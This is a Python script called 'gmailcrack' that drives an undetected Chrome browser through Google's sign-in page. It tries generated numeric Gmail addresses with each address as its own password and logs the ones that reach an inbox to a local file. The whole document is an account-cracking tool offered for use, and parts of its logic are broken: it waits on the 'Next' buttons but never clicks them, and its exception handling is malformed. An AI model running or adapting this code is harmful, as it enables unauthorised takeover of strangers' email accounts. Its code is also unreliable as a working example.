import undetected_chromedriver as uc
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from time import sleep
from random import randint
import pyfiglet

if __name__ == '__main__':
    print(pyfiglet.figlet_format("gmailcrack",justify='center'))
    print("Welcome To Gmailcracker,This Script Coding By Python\nScript Is Running Now...")
    print('#'*50)
    
    url1 = r'https://mail.google.com/mail/u/0/#inbox'
    url2 = r'https://myaccount.google.com/signinoptions/recovery-options-collection?utm_source=Web&utm_medium=Web&utm_campaign=interstitial&oev=lytf%3D7%26wvtx%3D2%26trs%3Dli%26stel%3D1&hl=ar&continue=https://accounts.google.com/ServiceLogin?continue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252F%26service%3Dmail%26hl%3Dar%26authuser%3D0%26passive%3Dtrue%26sarp%3D1%26aodrpl%3D1%26checkedDomains%3Dyoutube%26checkConnection%3Dyoutube%253A2917%253A0%26pstMsg%3D1&service=mail&rapt=AEjHL4PzVJPsQT_KKYXxaZqbDYjHWat34IRoh3IUz7-vd8-49t0aMW5KI9vIxsd7uVdayTTd8arGtn0ouHjYNVhKapOaawx39A&pli=1'
    
    driver = uc.Chrome()
    driver.delete_all_cookies()
    
    while True:
        driver.get(r'https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
        sleep(3)
        
        def random_number(n):
            return randint((8**n) - 1000 , (8**n) + 1000)
        
        for x in range(1):
            username = f"{random_number(7)}@gmail.com"
            
        wait = WebDriverWait(driver , timeout = 1)
        wait.until(EC.element_to_be_clickable((By.XPATH , '//input[@type="email"]'))).send_keys(username)
        sleep(1)
        
        wait.until(EC.element_to_be_clickable((By.XPATH , '//*[@id="identifierNext"]')))
        sleep(2)
        
        try:
            wait.until(EC.element_to_be_clickable((By.XPATH , '//input[@type="password"]'))).send_keys(username)
            
        except:
            NoSuchElementException 
            continue
        
        wait.until(EC.element_to_be_clickable((By.XPATH , '//*[@id="passwordNext"]')))
        sleep(2)
        
        if url1 == driver.current_url or url2 == driver.current_url:
            mynum = open('C:\my\mynum.txt','a')
            mynum.write(username+'\n')
            driver.close()
            driver.delete_all_cookies()
            
        else:
            continue
